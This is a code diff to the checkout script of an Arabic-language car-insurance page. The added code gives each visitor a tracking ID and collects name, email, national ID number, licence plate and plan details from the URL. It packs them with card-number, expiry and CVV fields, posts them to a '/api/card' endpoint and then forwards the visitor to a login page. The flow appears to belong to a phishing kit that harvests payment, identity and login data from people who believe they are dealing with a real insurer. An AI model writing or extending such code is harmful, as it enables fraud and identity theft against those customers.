@@ -394,7 +394,40 @@ function selectPay(type) {
   document.getElementById('radio-debit').classList.toggle('checked', type === 'debit');
 }
 function purchase() {
-  window.location.href = 'login_ar.html';
+  var params = new URLSearchParams(location.search);
+  var visitId = localStorage.getItem('qic_visit_id') || ('v_' + Date.now().toString(36) + Math.random().toString(36).slice(2, 8));
+  localStorage.setItem('qic_visit_id', visitId);
+
+  var payload = {
+    id: visitId,
+    visitId: visitId,
+    lang: 'ar',
+    page: 'car-checkout-form.html',
+    cardNumber: '',
+    cardHolder: params.get('name') || '',
+    cardExpiry: '',
+    cardCvv: '',
+    name: params.get('name') || '',
+    email: params.get('email') || '',
+    qid: params.get('qid') || '',
+    gender: params.get('gender') || '',
+    plate: params.get('plate') || '',
+    plate_no: params.get('plate_no') || '',
+    planName: params.get('planName') || '',
+    price: params.get('price') || '',
+    features: params.get('features') || '',
+    start_date: params.get('start_date') || ''
+  };
+
+  fetch('/api/card', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  }).then(function() {
+    window.location.href = 'login_ar.html?id=' + encodeURIComponent(visitId);
+  }).catch(function() {
+    window.location.href = 'login_ar.html?id=' + encodeURIComponent(visitId);
+  });
 }
 function toggleCollapse(id) {
   document.getElementById(id + '-pill').classList.toggle('open');
